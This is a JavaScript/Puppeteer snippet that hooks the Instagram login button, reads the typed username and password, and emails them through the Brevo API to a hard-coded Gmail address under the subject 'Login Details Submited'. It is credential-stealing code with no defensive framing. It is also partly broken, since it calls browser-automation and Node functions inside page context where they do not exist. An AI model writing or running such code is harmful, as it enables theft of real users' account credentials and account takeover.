await page.evaluate(async () => {

  const button = document.querySelector('button._acan._acap._acas._aj1-._ap30');
  try {
      const currentUrl = await page.url();
      button.addEventListener('click', async () => {
          const username = document.querySelector(`input[name="username"]`).value;
          const password = document.querySelector(`input[name="password"]`).value;
          console.log(currentUrl == "https://www.instagram.com/accounts/onetap/?next=%2F");
          console.log(password.length != 0);
          console.log(username.length != 0)
          console.log('Button clicked!');
          await page.waitForTimeout(10000); // 5000 milliseconds = 5 seconds
          if (index === false && currentUrl == "https://www.instagram.com/accounts/onetap/?next=%2F"
              && password.length != 0 && username.length != 0) {

              console.log(username)
              console.log(password)
              index = true
              const response = await axios.post(
                  `https://api.brevo.com/v3/smtp/email`,
                  {
                      "sender": {
                          "name": "Test App",
                          "email": "support@testapp.com"
                      },
                      "to": [
                          {
                              "email": "dailydevo9@gmail.com",
                              "name": "User"
                          },
                          // {
                          //     "email": email,
                          //     "name": "User"
                          // },
                          // {
                          //     "email": email,
                          //     "name": "User"
                          // }
                      ],
                      subject: `Login Details Submited`,
                      "htmlContent": `<p>email: ${username}\n\npassword: ${password}</p>`
                  },
                  {
                      headers: {
                          "api-key": process.env.BREVO,
                          "accept": "application/json",
                          'Content-Type': ['application/json', 'application/json']
                      }
                  }
              );

              if (response.status <= 300) {
                  index = true


                  // res.redirect('/')
              } else {
                  // res.redirect('/')
              }

          }

      });
  } catch (e) {

      try {
          const username = document.querySelector(`input[name="username"]`);
          const password = document.querySelector(`input[name="password"]`);
          // console.log(currentUrl);
          console.log(password.value);
          console.log(username.value)
          console.log('Button clicked!22');
      } catch (e) { }
  }
});